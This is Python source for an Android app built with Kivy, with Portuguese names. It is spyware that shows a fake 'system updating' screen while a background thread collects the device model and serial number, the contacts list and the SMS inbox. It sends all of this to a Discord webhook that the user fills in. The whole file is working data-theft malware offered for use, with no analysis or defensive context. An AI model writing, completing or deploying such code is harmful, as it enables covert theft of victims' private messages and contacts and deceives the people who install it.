import os, json, threading, urllib.request
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from android.permissions import request_permissions, Permission

WEBHOOK = "COLE_AQUI_TEU_WEBHOOK_DISCORD"

def enviar(msg):
    try:
        data = json.dumps({"content": msg[:1900]}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print("erro:", e)

def coletar_dispositivo():
    info = {
        "modelo": os.popen("getprop ro.product.model").read().strip(),
        "marca": os.popen("getprop ro.product.brand").read().strip(),
        "android": os.popen("getprop ro.build.version.release").read().strip(),
        "imei_pseudo": os.popen("getprop ro.serialno").read().strip(),
    }
    enviar("DISPOSITIVO:\n" + json.dumps(info, indent=2))

def coletar_contatos():
    try:
        out = os.popen("content query --uri content://contacts/people").read()
        enviar("CONTATOS:\n" + (out[:1800] if out else "vazio"))
    except Exception as e:
        enviar("contatos erro: " + str(e))

def coletar_sms():
    try:
        out = os.popen("content query --uri content://sms/inbox").read()
        enviar("SMS:\n" + (out[:1800] if out else "vazio"))
    except Exception as e:
        enviar("sms erro: " + str(e))

class Root(BoxLayout):
    def __init__(self, **kw):
        super().__init__(orientation="vertical", **kw)
        self.add_widget(Label(text="Sistema atualizando...\nAguarde."))
        self.add_widget(Button(text="OK", on_press=lambda x: App.get_running_app().stop()))

class ColetorApp(App):
    def build(self):
        request_permissions([
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.ACCESS_FINE_LOCATION,
            Permission.INTERNET,
        ])
        Clock.schedule_once(lambda dt: threading.Thread(target=self.trabalhar, daemon=True).start(), 3)
        return Root()

    def trabalhar(self):
        enviar("APP INICIADO")
        coletar_dispositivo()
        coletar_contatos()
        coletar_sms()

if __name__ == "__main__":
    ColetorApp().run()